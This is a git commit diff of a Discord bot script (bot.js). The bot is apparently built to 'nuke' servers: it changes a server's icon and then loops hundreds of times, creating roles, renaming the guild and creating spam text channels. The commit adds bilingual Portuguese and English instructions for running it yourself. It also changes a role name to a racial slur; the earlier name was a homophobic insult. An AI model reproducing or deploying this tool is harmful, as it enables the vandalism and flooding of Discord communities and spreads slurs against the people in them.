69feb9e423e9e8ce46d8d46a025f99bd7a0ba864
chocoboii~ <63813281+defoko-bot@users.noreply.github.com>
2020-05-26 14:33:53 -0400

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,3 +1,20 @@
+/* como usar vc mesmo / how to use by yourself
+   1: https://discord.com/developers/applications e crie um novo app / this site on the side and make a new app
+   2: clique no botão "bot" ao lado e clique em "add bot" e confirme / click on the "bot" button on the side and click on the "add bot" and confirm
+   3: na parte escrita "token" clique em "copy" / on the token part click on the "copy" button
+   4: na parte escrita "client.login(process.env.BOT_TOKEN);" neste arquivo, mude o process.env.BOT_TOKEN pelo seu token entre " " / on the client.login(process.env.BOT_TOKEN); part of this file, change the process.env.BOT_TOKEN to your token between " "
+   5: na parte escrito client.user.setActivity, apenas apague tudo na linha / on the client.user.setActivity, just erase the whole row
+   6: nas duas linhas q estão escrito "process.env.SERVER_NAME +" apenas apague isso (não a linha inteira, apenas isso) / on both rows that has the "process.env.SERVER_NAME +", just erase this part (not the whole row)
+   7: instale o node.js / install node.js
+   8: crie um arquivo .txt na pasta do bot e renomeie ela para qualquer nome final .bat (não pode ser tipo nome.bat.txt, tem q ser nome.bat) / on the bot path, make a file and rename it to anything .bat (it must be name.bat, not name.bat.txt)
+   9: edite o arquivo e escreva apenas "node bot.js" (sem as aspas) e salve o arquivo / edit the file and write "node bot.js" (without the ")
+   10: execute e gg / execute and gg
+   
+   -mene padero
+   
+  */
+
+
 const Discord = require("discord.js");
 const client = new Discord.Client();
 
@@ -28,7 +45,7 @@ client.on("message", async (message) => {
        message.guild.setIcon('./icon.png') 
 	message.channel.send(`discord tem limite de 500 canais e 200 cargos, n reclama se não criar mais canais, da !!del pra apagar tudo mas com lag fudido`)
 	for(i = 0; i < 499; i++){
-		message.guild.createRole('henry gay')
+		message.guild.createRole('nibbaa')
 		const texto = makeid(32);
 	    	message.guild.setName(process.env.SERVER_NAME + `${texto}`)
 	    	message.guild.createChannel(`${texto}`, 'text');
@@ -52,4 +69,4 @@ client.on("message", async (message) => {
 client.login(process.env.BOT_TOKEN);
 
 //para de olhar aqui poha
-//- mene paradino
+//- mene padero
